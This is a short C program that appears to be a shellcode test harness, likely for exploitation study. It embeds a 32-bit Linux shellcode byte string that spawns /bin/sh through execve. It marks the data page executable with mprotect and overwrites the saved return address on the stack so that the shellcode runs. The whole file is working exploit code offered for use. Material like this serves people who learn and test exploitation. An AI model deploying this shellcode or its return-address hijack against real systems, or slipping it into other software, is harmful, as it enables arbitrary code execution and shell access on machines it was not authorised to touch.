#include <sys/mman.h>

#define PAGE_SIZE 4096U

// The trailing null byte is implied because this is a string
char shellcode[] = {
    "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd"
    "\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69"
    "\x6e\x2f\x73\x68"
};

void test_shellcode(int dummy) {

    char **ptr = (char **)&dummy;

    // The data section is non-executable
    // Change protection bits for the page containing our shellcode
    mprotect((void *)((unsigned int)shellcode & ~(PAGE_SIZE - 1)), 2 * PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);

    ptr--;          // Point to saved EIP
    *ptr = shellcode;
}

int main() {
    test_shellcode(0);  
    return 0;
}